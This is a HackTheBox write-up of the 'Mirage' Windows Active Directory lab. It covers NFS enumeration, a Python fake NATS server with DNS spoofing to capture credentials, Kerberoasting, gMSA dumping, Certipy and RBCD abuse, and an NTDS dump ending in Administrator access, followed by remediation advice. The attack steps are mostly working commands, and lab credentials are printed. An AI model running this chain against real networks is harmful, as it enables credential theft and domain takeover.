# HackTheBox - Mirage Writeup

**Machine:** Mirage  
**IP Address:** 10.10.11.78  
**Difficulty:** Hard
**OS:** Windows (Active Directory)

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Target Details

- Hosts: `dc01.mirage.htb`, `mirage.htb`, `nats-svc.mirage.htb`

### NFS Enumeration

```bash
showmount -e 10.10.11.78
mkdir /tmp/mirage
sudo mount -t nfs 10.10.11.78:/MirageReports /tmp/mirage
cd /tmp/mirage
ls
```

PDF reports revealed the hostname `nats-svc.mirage.htb` and the need to spoof DNS for a NATS service on port 4222.

---

## Initial Access

### Fake NATS Server and DNS Spoofing

Installed NATS CLI:

```bash
go install github.com/nats-io/natscli/nats@v0.0.33
```

Fake NATS server (`fake_nats.py`):

```python
import socket

HOST = "0.0.0.0"
PORT = 4222

print(f"[+] Fake NATS Server listening on {HOST}:{PORT}")
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)

while True:
    try:
        client, addr = s.accept()
        print(f"[+] Connection from {addr}")

        # Send fake INFO – required for NATS Client handshake
        info = b'INFO {"server_id":"FAKE","version":"2.11.0","auth_required":true}\r\n'
        client.sendall(info)

        data = client.recv(2048)
        print("[>] Received:")
        print(data.decode(errors='replace'))

        client.close()

    except Exception as e:
        print(f"[!] Error: {e}")
```

Spoofed DNS record with `nsupdate`:

```
server 10.10.11.78
update add nats-svc.mirage.htb 3600 A 10.10.16.x
send
```

Captured credentials for `Dev_Account_A`:

- `Dev_Account_A / hx5h7F5554fP@1337!`

### NATS Consumer and Credential Harvesting

Created a consumer and read messages:

```bash
nats --server nats://10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' consumer add auth_logs test --pull --ack explicit
nats --server nats://10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' consumer next auth_logs test --count=10
```

Recovered credentials:

- `david.jjackson / pN8kQmn6b86!1234@`

---

## Privilege Escalation - User

### Kerberos Setup and Kerberoasting

```bash
nxc smb 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --generate-krb5-file /etc/krb5.conf
ntpdate 10.10.11.78
nxc ldap 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --users
nxc smb 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --generate-tgt david.jjackson
export KRB5CCNAME=david.jjackson.ccache
impacket-GetUserSPNs 'mirage.htb/david.jjackson' -dc-host dc01.mirage.htb -k -request
john --wordlist=/usr/share/wordlists/rockyou.txt nathan.hash
```

Generated TGT and connected as `nathan.aadam`:

```bash
nxc smb dc01.mirage.htb -u nathan.aadam -p 'HIDDEN' -k --generate-tgt nathan.aadam
export KRB5CCNAME=nathan.aadam.ccache
evil-winrm -i dc01.mirage.htb -u nathan.aadam -r mirage.htb
```

User flag:

```cmd
type C:\Users\nathan.aadam\Desktop\user.txt
```

### AutoLogon Creds for mark.bbond

WinPEAS found AutoLogon credentials:

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' |
Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon
```

---

## Privilege Escalation - Root

### Enable javier.mmarshall and Dump gMSA

Enabled the disabled account and cloned logon hours with mark’s creds:

```powershell
$Password = ConvertTo-SecureString "1day@atime" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ("MIRAGE\mark.bbond", $Password)
Enable-ADAccount -Identity javier.mmarshall -Cred $Cred

$logonhours = Get-ADUser mark.bbond -Properties LogonHours | select-object -expand logonhours
[byte[]]$hours1 = $logonhours
Set-ADUser -Identity javier.mmarshall -Cred $Cred -Replace @{logonhours = $hours1}
```

Reset password and request TGT:

```bash
bloodyAD --kerberos -u "mark.bbond" -p 'HIDDEN' -d "mirage.htb" --host "dc01.mirage.htb" set password "javier.mmarshall" 'pa$$w0rd'
nxc smb dc01.mirage.htb -u javier.mmarshall -p 'pa$$w0rd' -k --generate-tgt javier.mmarshall
export KRB5CCNAME=javier.mmarshall.ccache
gMSADumper.py -k -d mirage.htb -l dc01.mirage.htb
```

Obtained `Mirage-Service$` NTLM hash.

### Certipy + RBCD to Dump Secrets

```bash
getTGT.py MIRAGE.HTB/Mirage-Service$ -hashes :305806d84f7cxxxxxxx7aaf40f0c7866
nxc smb dc01.mirage.htb -u mark.bbond -p 'HIDDEN' -k --generate-tgt mark.bbond

KRB5CCNAME=Mirage-Service$.ccache certipy-ad account -u 'Mirage-Service$' -k -target dc01.mirage.htb -upn 'dc01$@mirage.htb' -user 'mark.bbond' update

KRB5CCNAME=mark.bbond.ccache certipy-ad req -k -target dc01.mirage.htb -ca 'mirage-DC01-CA' -template 'User' -dc-ip 10.129.48.148

KRB5CCNAME=Mirage-Service$.ccache certipy-ad account -u 'Mirage-Service$' -k -target dc01.mirage.htb -upn 'mark.bbond@mirage.htb' -user 'mark.bbond' update -dc-ip 10.129.48.148

certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
set_rbcd dc01$ nathan.aadam
```

Requested TGS for CIFS and dumped NTDS:

```bash
getST.py -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/nathan.aadam:3edc#EDC3' -k
export KRB5CCNAME=DC01$@CIFS_dc01.mirage.htb@MIRAGE.HTB.ccache
secretsdump.py -k -no-pass dc01.mirage.htb
```

Authenticated as Administrator:

```bash
getTGT.py -hashes :7be6d4f3c2b9c0e3560f5a29exxxxxx -dc-ip 10.10.11.78 mirage.htb/Administrator
export KRB5CCNAME=Administrator.ccache
evil-winrm -i dc01.mirage.htb -u Administrator -r mirage.htb
```

Root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

1. NFS shares can leak hostnames and service hints for targeted spoofing.
2. DNS spoofing enabled credential interception for NATS.
3. Kerberoasting and delegated rights enabled lateral movement.
4. gMSA dumping plus Certipy can enable certificate-based attacks.
5. RBCD with S4U2Proxy allows domain escalation to DC access.

---

## Tools Used

- showmount
- mount (NFS)
- nsupdate
- nats CLI
- bloodhound-python
- nxc
- impacket-GetUserSPNs
- john
- evil-winrm
- gMSADumper.py
- bloodyAD
- certipy-ad
- secretsdump.py

---

## Flags

**User Flag:** `C:\Users\nathan.aadam\Desktop\user.txt` (value not recorded in PDF)  
**Root Flag:** `C:\Users\Administrator\Desktop\root.txt` (value not recorded in PDF)

---

## Remediation Recommendations

### Critical Severity

1. **Secure NATS Credentials and DNS**

   - **Issue:** DNS spoofing allowed fake NATS server and credential capture.
   - **Impact:** Credential theft and lateral access.
   - **Remediation:**
     - Use DNSSEC and restrict dynamic DNS updates.
     - Enforce TLS and mutual auth for NATS.

2. **Harden Kerberos and gMSA Usage**

   - **Issue:** gMSA credentials were dumped and abused.
   - **Impact:** Domain compromise and certificate abuse.
   - **Remediation:**
     - Limit gMSA read permissions.
     - Rotate gMSA secrets and monitor access.

### High Severity

3. **Reduce Delegated Rights (RBCD / IT Support)**

   - **Issue:** Delegated rights enabled RBCD escalation.
   - **Impact:** DC impersonation and NTDS dump.
   - **Remediation:**
     - Audit and minimize `msDS-AllowedToActOnBehalfOfOtherIdentity`.
     - Restrict who can modify AD accounts and logon hours.

4. **Restrict Kerberoastable Accounts**

   - **Issue:** SPNs on user accounts exposed to offline cracking.
   - **Impact:** Credential compromise for privileged users.
   - **Remediation:**
     - Use strong random passwords on service accounts.
     - Prefer gMSA with least-privilege.

### Medium Severity

5. **Limit NFS Exposure**

   - **Issue:** NFS shares leaked internal details.
   - **Impact:** Enumeration and service targeting.
   - **Remediation:**
     - Restrict NFS exports to trusted hosts and require auth.
